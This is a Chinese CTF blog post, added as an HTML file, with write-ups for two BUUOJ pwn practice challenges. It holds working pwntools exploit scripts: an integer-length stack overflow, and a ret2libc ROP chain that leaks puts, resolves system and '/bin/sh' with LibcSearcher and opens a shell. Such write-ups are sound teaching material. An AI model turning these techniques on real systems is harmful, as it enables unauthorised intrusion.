@@ -1,0 +1,429 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width">
+<meta name="theme-color" content="#222" media="(prefers-color-scheme: light)">
+<meta name="theme-color" content="#222" media="(prefers-color-scheme: dark)"><meta name="generator" content="Hexo 6.3.0">
+
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
+  <link rel="mask-icon" href="/images/logo.svg" color="#222">
+
+<link rel="stylesheet" href="/css/main.css">
+
+
+
+<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.2.0/css/all.min.css" integrity="sha256-AbA177XfpSnFEvgpYu1jMygiLabzPCJCRIBtR5jGc0k=" crossorigin="anonymous">
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/animate.css/3.1.1/animate.min.css" integrity="sha256-PR7ttpcvz8qrF57fur/yAx1qXMFJeJFiA6pSzWi0OIE=" crossorigin="anonymous">
+
+<script class="next-config" data-name="main" type="application/json">{"hostname":"pa1r0t.github.io","root":"/","images":"/images","scheme":"Gemini","darkmode":true,"version":"8.13.2","exturl":false,"sidebar":{"position":"left","width":320,"display":"always","padding":18,"offset":12},"copycode":{"enable":false,"style":null},"bookmark":{"enable":false,"color":"#222","save":"auto"},"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"stickytabs":false,"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"fadeInDown","post_body":"fadeInDown","coll_header":"fadeInLeft","sidebar":"fadeInUp"}},"prism":false,"i18n":{"placeholder":"搜索...","empty":"没有找到任何搜索结果：${query}","hits_time":"找到 ${hits} 个搜索结果（用时 ${time} 毫秒）","hits":"找到 ${hits} 个搜索结果"},"path":"/search.xml","localsearch":{"enable":true,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":true}}</script><script src="/js/config.js"></script>
+
+    <meta name="description" content="pwn">
+<meta property="og:type" content="article">
+<meta property="og:title" content="pwn_practice1">
+<meta property="og:url" content="https://pa1r0t.github.io/2023/01/13/pwn-practice1/index.html">
+<meta property="og:site_name" content="Pa1r0t">
+<meta property="og:description" content="pwn">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://pa1r0t.github.io/images/image-20230113115308826.png">
+<meta property="og:image" content="https://pa1r0t.github.io/images/image-20230113115524208.png">
+<meta property="og:image" content="https://pa1r0t.github.io/images/image-20230113115909861.png">
+<meta property="og:image" content="https://pa1r0t.github.io/images/image-20230113115811014.png">
+<meta property="og:image" content="https://pa1r0t.github.io/images/image-20230113115933550.png">
+<meta property="og:image" content="https://pa1r0t.github.io/images/image-20230113120005292.png">
+<meta property="og:image" content="https://pa1r0t.github.io/images/image-20230113120243209.png">
+<meta property="og:image" content="https://pa1r0t.github.io/images/image-20230113201822956.png">
+<meta property="og:image" content="https://pa1r0t.github.io/images/image-20230113202715207.png">
+<meta property="og:image" content="https://pa1r0t.github.io/images/image-20230113203306010.png">
+<meta property="article:published_time" content="2023-01-13T03:50:36.000Z">
+<meta property="article:modified_time" content="2023-01-13T12:33:23.186Z">
+<meta property="article:author" content="Pa1r0t_9e">
+<meta name="twitter:card" content="&lt;twitter:card&gt;">
+<meta name="twitter:image" content="https://pa1r0t.github.io/2023/01/13/pwn-practice1/%3Ctwitter:image%3E">
+<meta name="twitter:creator" content="@&lt;twitter:creator&gt;">
+<meta name="twitter:site" content="<twitter:site>">
+<link rel="publisher" href="%3Cg+:profile_link%3E">
+<meta property="fb:admins" content="&lt;fb:admin_id&gt;">
+<meta property="fb:app_id" content="&lt;fb:app_id&gt;">
+
+
+<link rel="canonical" href="https://pa1r0t.github.io/2023/01/13/pwn-practice1/">
+
+
+
+<script class="next-config" data-name="page" type="application/json">{"sidebar":"","isHome":false,"isPost":true,"lang":"zh-CN","comments":true,"permalink":"https://pa1r0t.github.io/2023/01/13/pwn-practice1/","path":"2023/01/13/pwn-practice1/","title":"pwn_practice1"}</script>
+
+<script class="next-config" data-name="calendar" type="application/json">""</script>
+<title>pwn_practice1 | Pa1r0t</title>
+  
+
+
+
+
+
+
+  <script async defer data-website-id="" src=""></script>
+
+  <script defer data-domain="" src=""></script>
+
+  <noscript>
+    <link rel="stylesheet" href="/css/noscript.css">
+  </noscript>
+<link rel="alternate" href="/atom.xml" title="Pa1r0t" type="application/atom+xml">
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage" class="use-motion">
+  <div class="headband"></div>
+
+  <main class="main">
+    <header class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-container">
+  <div class="site-nav-toggle">
+    <div class="toggle" aria-label="切换导航栏" role="button">
+        <span class="toggle-line"></span>
+        <span class="toggle-line"></span>
+        <span class="toggle-line"></span>
+    </div>
+  </div>
+
+  <div class="site-meta">
+
+    <a href="/" class="brand" rel="start">
+      <i class="logo-line"></i>
+      <p class="site-title">Pa1r0t</p>
+      <i class="logo-line"></i>
+    </a>
+      <p class="site-subtitle" itemprop="description">re&crypto</p>
+  </div>
+
+  <div class="site-nav-right">
+    <div class="toggle popup-trigger">
+        <i class="fa fa-search fa-fw fa-lg"></i>
+    </div>
+  </div>
+</div>
+
+
+
+<nav class="site-nav">
+  <ul class="main-menu menu"><li class="menu-item menu-item-home"><a href="/" rel="section"><i class="fa fa-home fa-fw"></i>首页</a></li><li class="menu-item menu-item-ctf"><a href="/ctf/" rel="section"><i class="fa fa-flag fa-fw"></i>ctf</a></li><li class="menu-item menu-item-re"><a href="/re/" rel="section"><i class="fa fa-brands fa-rev fa-fw"></i>re</a></li><li class="menu-item menu-item-friendly-chain"><a href="/links/" rel="section"><i class="fa fa-user-group fa-fw"></i>Friendly chain</a></li><li class="menu-item menu-item-about"><a href="/about/" rel="section"><i class="fa fa-user fa-fw"></i>关于</a></li>
+      <li class="menu-item menu-item-search">
+        <a role="button" class="popup-trigger"><i class="fa fa-search fa-fw"></i>搜索
+        </a>
+      </li>
+  </ul>
+</nav>
+
+
+
+  <div class="search-pop-overlay">
+    <div class="popup search-popup"><div class="search-header">
+  <span class="search-icon">
+    <i class="fa fa-search"></i>
+  </span>
+  <div class="search-input-container">
+    <input autocomplete="off" autocapitalize="off" maxlength="80"
+           placeholder="搜索..." spellcheck="false"
+           type="search" class="search-input">
+  </div>
+  <span class="popup-btn-close" role="button">
+    <i class="fa fa-times-circle"></i>
+  </span>
+</div>
+<div class="search-result-container no-result">
+  <div class="search-result-icon">
+    <i class="fa fa-spinner fa-pulse fa-5x"></i>
+  </div>
+</div>
+
+    </div>
+  </div>
+
+</div>
+        
+  
+  <div class="toggle sidebar-toggle" role="button">
+    <span class="toggle-line"></span>
+    <span class="toggle-line"></span>
+    <span class="toggle-line"></span>
+  </div>
+
+  <aside class="sidebar">
+
+    <div class="sidebar-inner sidebar-nav-active sidebar-toc-active">
+      <ul class="sidebar-nav">
+        <li class="sidebar-nav-toc">
+          文章目录
+        </li>
+        <li class="sidebar-nav-overview">
+          站点概览
+        </li>
+      </ul>
+
+      <div class="sidebar-panel-container">
+        <!--noindex-->
+        <div class="post-toc-wrap sidebar-panel">
+            <div class="post-toc animated"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#hgame2018-flag-server"><span class="nav-number">1.</span> <span class="nav-text">hgame2018_flag_server</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%BC%80%E5%90%AFdocker"><span class="nav-number">1.1.</span> <span class="nav-text">开启docker</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E7%A8%8B%E5%BA%8F%E6%A0%B8%E5%BF%83%E9%80%BB%E8%BE%91"><span class="nav-number">1.2.</span> <span class="nav-text">程序核心逻辑</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#exp"><span class="nav-number">1.3.</span> <span class="nav-text">exp</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E7%BB%93%E6%9E%9C"><span class="nav-number">1.4.</span> <span class="nav-text">结果</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#ciscn-2019-c-1"><span class="nav-number">2.</span> <span class="nav-text">ciscn_2019_c_1</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%A0%B8%E5%BF%83%E7%A8%8B%E5%BA%8F"><span class="nav-number">2.1.</span> <span class="nav-text">核心程序</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%AF%BB%E6%89%BErop"><span class="nav-number">2.2.</span> <span class="nav-text">寻找rop</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E8%84%9A%E6%9C%AC%EF%BC%9A"><span class="nav-number">2.3.</span> <span class="nav-text">脚本：</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E7%BB%93%E6%9E%9C%EF%BC%9A"><span class="nav-number">2.4.</span> <span class="nav-text">结果：</span></a></li></ol></li></ol></div>
+        </div>
+        <!--/noindex-->
+
+        <div class="site-overview-wrap sidebar-panel">
+          <div class="site-author site-overview-item animated" itemprop="author" itemscope itemtype="http://schema.org/Person">
+    <img class="site-author-image" itemprop="image" alt="Pa1r0t_9e"
+      src="/images/avatar.gif">
+  <p class="site-author-name" itemprop="name">Pa1r0t_9e</p>
+  <div class="site-description" itemprop="description">welcome to my bolg</div>
+</div>
+<div class="site-state-wrap site-overview-item animated">
+  <nav class="site-state">
+      <div class="site-state-item site-state-posts">
+        <a href="/archives/">
+          <span class="site-state-item-count">22</span>
+          <span class="site-state-item-name">日志</span>
+        </a>
+      </div>
+      <div class="site-state-item site-state-categories">
+          <a href="/categories/">
+        <span class="site-state-item-count">2</span>
+        <span class="site-state-item-name">分类</span></a>
+      </div>
+  </nav>
+</div>
+  <div class="links-of-author site-overview-item animated">
+      <span class="links-of-author-item">
+        <a href="mailto:2817455529@qq.com" title="E-Mail → mailto:2817455529@qq.com" rel="noopener" target="_blank"><i class="fa fa-envelope fa-fw"></i>E-Mail</a>
+      </span>
+  </div>
+  <div class="cc-license site-overview-item animated" itemprop="license">
+    <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" class="cc-opacity" rel="noopener" target="_blank"><img src="https://cdnjs.cloudflare.com/ajax/libs/creativecommons-vocabulary/2020.11.3/assets/license_badges/small/by_nc_sa.svg" alt="Creative Commons"></a>
+  </div>
+
+
+
+        </div>
+      </div>
+    </div>
+  </aside>
+  <div class="sidebar-dimmer"></div>
+
+
+    </header>
+
+    
+
+<noscript>
+  <div class="noscript-warning">Theme NexT works best with JavaScript enabled</div>
+</noscript>
+
+
+    <div class="main-inner post posts-expand">
+
+
+  
+
+
+<div class="post-block">
+  
+  
+
+  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="https://pa1r0t.github.io/2023/01/13/pwn-practice1/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.gif">
+      <meta itemprop="name" content="Pa1r0t_9e">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Pa1r0t">
+      <meta itemprop="description" content="welcome to my bolg">
+    </span>
+
+    <span hidden itemprop="post" itemscope itemtype="http://schema.org/CreativeWork">
+      <meta itemprop="name" content="pwn_practice1 | Pa1r0t">
+      <meta itemprop="description" content="">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+          pwn_practice1
+        </h1>
+
+        <div class="post-meta-container">
+          <div class="post-meta">
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar"></i>
+      </span>
+      <span class="post-meta-item-text">发表于</span>
+      
+
+      <time title="创建时间：2023-01-13 11:50:36 / 修改时间：20:33:23" itemprop="dateCreated datePublished" datetime="2023-01-13T11:50:36+08:00">2023-01-13</time>
+    </span>
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-folder"></i>
+      </span>
+      <span class="post-meta-item-text">分类于</span>
+        <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+          <a href="/categories/ctf/" itemprop="url" rel="index"><span itemprop="name">ctf</span></a>
+        </span>
+    </span>
+
+  
+</div>
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+        <p>pwn</p>
+<span id="more"></span>
+
+<h2 id="hgame2018-flag-server"><a href="#hgame2018-flag-server" class="headerlink" title="hgame2018_flag_server"></a>hgame2018_flag_server</h2><h3 id="开启docker"><a href="#开启docker" class="headerlink" title="开启docker"></a>开启docker</h3><figure class="highlight dockerfile"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker <span class="keyword">run</span><span class="language-bash"> -v <span class="string">&quot;<span class="subst">$(pwd)</span>:/ctf/work&quot;</span> -i -t skysider/pwndocker /bin/bash</span></span><br></pre></td></tr></table></figure>
+
+<p><img src="/./../images/image-20230113115308826.png" alt="image-20230113115308826"></p>
+<h3 id="程序核心逻辑"><a href="#程序核心逻辑" class="headerlink" title="程序核心逻辑"></a>程序核心逻辑</h3><p>这里有个随机值，输入的值和随机值比较</p>
+<p><img src="/./../images/image-20230113115524208.png" alt="image-20230113115524208"></p>
+<p>我准备用逆向的守法，来搞它，写了个cpp，结果运行多次结果都不一样</p>
+<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;time.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;random&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">(<span class="type">void</span>)</span></span>&#123;</span><br><span class="line">	<span class="type">unsigned</span>  <span class="type">int</span> v3 = <span class="built_in">time</span>(<span class="number">0</span>);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;%d\n&quot;</span>,v3);</span><br><span class="line">	<span class="built_in">srand</span>(v3);</span><br><span class="line">	<span class="type">int</span> v8 = <span class="built_in">rand</span>();</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;%u&quot;</span>,v8);</span><br><span class="line">	<span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">&#125; </span><br></pre></td></tr></table></figure>
+
+<p>giao~~~~~</p>
+<p>然后我只能老老实实找漏洞了</p>
+<p>先是发现可以读取字符串name<img src="/./../images/image-20230113115909861.png" alt="image-20230113115909861"></p>
+<p>找到读取字符串的函数是自己编的<img src="/./../images/image-20230113115811014.png" alt="image-20230113115811014"></p>
+<p>最后v10进行检验<img src="/./../images/image-20230113115933550.png" alt="image-20230113115933550"></p>
+<p>这里看栈分布<img src="/./../images/image-20230113120005292.png" alt="image-20230113120005292"></p>
+<p>直接在s1的下面，直接填充’A’*((0x50-0x10)+size(int))</p>
+<h3 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h3><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">io = remote(<span class="string">&#x27;node4.buuoj.cn&#x27;</span>,<span class="number">28388</span>)</span><br><span class="line"><span class="comment"># io = process(&#x27;./flag_server&#x27;)</span></span><br><span class="line">io.sendlineafter(<span class="string">&#x27;your username length: &#x27;</span>,<span class="string">b&#x27;-1&#x27;</span>)</span><br><span class="line">io.sendline(<span class="string">b&#x27;A&#x27;</span>*<span class="number">0x44</span>)</span><br><span class="line">io.interactive()</span><br><span class="line">io.close()</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<h3 id="结果"><a href="#结果" class="headerlink" title="结果"></a>结果</h3><p><img src="/./../images/image-20230113120243209.png" alt="image-20230113120243209"></p>
+<hr>
+<h2 id="ciscn-2019-c-1"><a href="#ciscn-2019-c-1" class="headerlink" title="ciscn_2019_c_1"></a>ciscn_2019_c_1</h2><h3 id="核心程序"><a href="#核心程序" class="headerlink" title="核心程序"></a>核心程序</h3><p><img src="/./../images/image-20230113201822956.png" alt="image-20230113201822956"></p>
+<p><strong>利用点</strong>：利用gets，去覆盖栈中的内容，利用rop链泄漏puts函数在内存中的地址，然后通过这个地址去找对应版本的libc，找到内存中system的地址和bin_sh字符串的地址，再利用一次rop链执行system函数即可</p>
+<p>这里有一个模块叫LibcSearcher，它可以让使用者不用担心本地和远程的libc是否统一，它可以帮你去寻找正在执行的libc。非常好用</p>
+<h3 id="寻找rop"><a href="#寻找rop" class="headerlink" title="寻找rop"></a>寻找rop</h3><p>目的：寻找pop rdi ret;指令，因为该文件是64位，而64位文件采用寄存器存放参数，第一个参数存放的寄存器就是rdi</p>
+<p>命令：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ROPgadget --binary ./ciscn_2019_c_1 --only <span class="string">&#x27;pop|ret&#x27;</span></span><br></pre></td></tr></table></figure>
+
+<p>结果：</p>
+<p><img src="/./../images/image-20230113202715207.png" alt="image-20230113202715207"></p>
+<h3 id="脚本："><a href="#脚本：" class="headerlink" title="脚本："></a>脚本：</h3><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="comment"># io = process(&#x27;./ciscn_2019_c_1&#x27;)</span></span><br><span class="line">io = remote(<span class="string">&quot;node4.buuoj.cn&quot;</span>,<span class="number">26320</span>)</span><br><span class="line">elf = ELF(<span class="string">&#x27;ciscn_2019_c_1&#x27;</span>)</span><br><span class="line"><span class="comment">#</span></span><br><span class="line">encrypt_addr = elf.sym[<span class="string">&#x27;encrypt&#x27;</span>]</span><br><span class="line">puts_got = elf.got[<span class="string">&#x27;puts&#x27;</span>]	<span class="comment"># 用于打印puts的地址</span></span><br><span class="line">puts_plt = elf.plt[<span class="string">&#x27;puts&#x27;</span>]	<span class="comment"># puts函数地址</span></span><br><span class="line">rdi_ret = <span class="number">0x400c83</span></span><br><span class="line">											<span class="comment"># puts函数的参数		puts函数的地址	puts函数执行完的返回地址，用于下一次的shellcode</span></span><br><span class="line">payload1 = <span class="string">b&#x27;A&#x27;</span> * <span class="number">0x50</span> + p64(<span class="number">0</span>) + p64(rdi_ret) + p64(puts_got) + p64(puts_plt) + p64(encrypt_addr)</span><br><span class="line"></span><br><span class="line">io.sendlineafter(<span class="string">b&#x27;Input your choice!&#x27;</span>,<span class="string">b&#x27;1&#x27;</span>)</span><br><span class="line">io.sendlineafter(<span class="string">b&#x27;Input your Plaintext to be encrypted&#x27;</span>,payload1)</span><br><span class="line">io.recvuntil(<span class="string">b&#x27;Ciphertext\n&#x27;</span>)</span><br><span class="line">io.recvuntil(<span class="string">b&#x27;\n&#x27;</span>)</span><br><span class="line"><span class="comment"># 拿到puts在内存中的地址</span></span><br><span class="line">puts_addr = u64(io.recvline().strip().ljust(<span class="number">8</span>,<span class="string">b&#x27;\0&#x27;</span>))</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;addr:&#x27;</span>,<span class="built_in">hex</span>(puts_addr))</span><br><span class="line"></span><br><span class="line"><span class="comment"># 找内存libc的地址</span></span><br><span class="line">libc = LibcSearcher(<span class="string">&#x27;puts&#x27;</span>,puts_addr)</span><br><span class="line"></span><br><span class="line">addr_base = puts_addr - libc.dump(<span class="string">&quot;puts&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;libc&#x27;</span>,addr_base)</span><br><span class="line">sys_addr = libc.dump(<span class="string">&#x27;system&#x27;</span>) + addr_base</span><br><span class="line">binsh_addr = libc.dump(<span class="string">&#x27;str_bin_sh&#x27;</span>) + addr_base</span><br><span class="line"></span><br><span class="line">payload2 = <span class="string">b&#x27;A&#x27;</span> * <span class="number">0x50</span> + p64(<span class="number">0</span>) + p64(rdi_ret) + p64(binsh_addr) + p64(sys_addr) + p64(encrypt_addr)</span><br><span class="line"></span><br><span class="line">io.sendlineafter(<span class="string">b&#x27;Input your Plaintext to be encrypted&#x27;</span>,payload2)</span><br><span class="line">io.interactive()</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<h3 id="结果："><a href="#结果：" class="headerlink" title="结果："></a>结果：</h3><p><img src="/./../images/image-20230113203306010.png" alt="image-20230113203306010"></p>
+
+    </div>
+
+    
+    
+    
+      
+
+
+    <footer class="post-footer">
+          <div class="reward-container">
+  <div>你的资助更能使我继续创作！！！</div>
+  <button>
+    赞赏
+  </button>
+  <div class="post-reward">
+      <div>
+        <img src="/images/wechatpay.jpg" alt="Pa1r0t_9e 微信">
+        <span>微信</span>
+      </div>
+      <div>
+        <img src="/images/alipay.png" alt="Pa1r0t_9e 支付宝">
+        <span>支付宝</span>
+      </div>
+
+  </div>
+</div>
+
+          
+
+<div class="post-copyright">
+<ul>
+  <li class="post-copyright-author">
+      <strong>本文作者： </strong>Pa1r0t_9e
+  </li>
+  <li class="post-copyright-link">
+      <strong>本文链接：</strong>
+      <a href="https://pa1r0t.github.io/2023/01/13/pwn-practice1/" title="pwn_practice1">https://pa1r0t.github.io/2023/01/13/pwn-practice1/</a>
+  </li>
+  <li class="post-copyright-license">
+    <strong>版权声明： </strong>本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" rel="noopener" target="_blank"><i class="fab fa-fw fa-creative-commons"></i>BY-NC-SA</a> 许可协议。转载请注明出处！
+  </li>
+</ul>
+</div>
+
+
+        
+
+          <div class="post-nav">
+            <div class="post-nav-item">
+                <a href="/2023/01/12/%E7%BC%96%E8%AF%91%E5%81%8F2/" rel="prev" title="编译2">
+                  <i class="fa fa-chevron-left"></i> 编译2
+                </a>
+            </div>
+            <div class="post-nav-item">
+                <a href="/2023/01/14/hgame2023/" rel="next" title="hgame2023">
+                  hgame2023 <i class="fa fa-chevron-right"></i>
+                </a>
+            </div>
+          </div>
+    </footer>
+  </article>
+</div>
+
+
+
+
+
+
+</div>
+  </main>
+
+  <footer class="footer">
+    <div class="footer-inner">
+
+
+<div class="copyright">
+  &copy; 
+  <span itemprop="copyrightYear">2023</span>
+  <span class="with-love">
+    <i class="fa fa-heart"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">Pa1r0t_9e</span>
+</div>
+<!--
+  <div class="powered-by">由 <a href="https://hexo.io/" rel="noopener" target="_blank">Hexo</a> & <a href="https://theme-next.js.org/" rel="noopener" target="_blank">NexT.Gemini</a> 强力驱动
+  </div>
+-->
+
+    </div>
+  </footer>
+
+  
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/animejs/3.2.1/anime.min.js" integrity="sha256-XL2inqUJaslATFnHdJOi9GfQ60on8Wx1C2H8DYiN1xY=" crossorigin="anonymous"></script>
+<script src="/js/comments.js"></script><script src="/js/utils.js"></script><script src="/js/motion.js"></script><script src="/js/next-boot.js"></script>
+
+  
+<script src="https://cdnjs.cloudflare.com/ajax/libs/hexo-generator-searchdb/1.4.1/search.js" integrity="sha256-1kfA5uHPf65M5cphT2dvymhkuyHPQp5A53EGZOnOLmc=" crossorigin="anonymous"></script>
+<script src="/js/third-party/search/local-search.js"></script>
+
+
+
+
+
+  
+
+
+
+
+
+</body>
+</html>
